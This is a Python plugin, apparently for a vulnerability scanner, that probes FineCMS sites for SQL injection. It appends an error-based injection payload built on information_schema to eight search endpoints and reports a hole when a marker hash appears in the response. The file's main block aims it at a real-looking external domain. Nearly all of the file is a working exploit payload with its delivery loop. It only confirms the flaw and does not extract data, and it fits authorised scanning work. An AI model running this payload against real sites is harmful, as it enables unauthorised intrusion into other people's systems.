#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__Author__ = 01001000entai
#_PlugName_ = finecms sqli
#_FileName_ = Plugin_Format.py
#__Refer___ = http://www.wooyun.org/bugs/wooyun-2010-060196

def assign(service, arg):
	if service == 'finecms':
		return True, arg

def audit(arg):

    ipos = ["book/index.php?c=search&catid=23",
            "down/index.php?c=search&catid=23",
            "fang/index.php?c=search&catid=23",
            "news/index.php?c=search&catid=23",
            "photo/index.php?c=search&catid=23",
            "special/index.hp?c=search&catid=23",
            "video/index.php?c=search&catid=23",
          	"shop/index.php?c=search&catid=23",
          ]
    payload = '%20and%20(select%201%20from%20(select%20count(*),concat(md5(1),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a)'
    for i in ipos:
        target = arg + i + payload
        code, head, body, errcode, final_url = curl.curl('-L %s' % target);
        if 'c4ca4238a0b923820dcc509a6f75849b1' in body:
            security_hole(target);

if __name__ == '__main__':
	from dummy import *
	audit(assign('finecms', 'http://www.wzxly.com/')[1])